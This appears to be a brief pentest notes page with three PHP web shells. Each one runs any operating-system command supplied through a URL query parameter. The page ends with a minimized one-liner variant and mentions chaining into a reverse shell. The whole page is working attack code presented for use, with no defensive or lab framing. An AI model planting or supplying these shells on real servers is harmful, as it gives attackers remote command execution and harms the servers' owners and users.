# PHP

This is used to execute command in the explorer using the parameter ?cmd=COMMAND in the url and after you can use a [[Reverse shells]] 

````php
<?php
	$cmd = system($_GET['cmd']);
	echo "<pre>" . shell_exec($cmd) . "</pre>";
?>
````

Or you can use only this:
````php
<?php
	system($_GET['cmd']);
?>
````

A way to simplify this to saves size is this:

````php
<?=`$_GET[0]`?>
````

---

# Tags

#webshell #shell 

---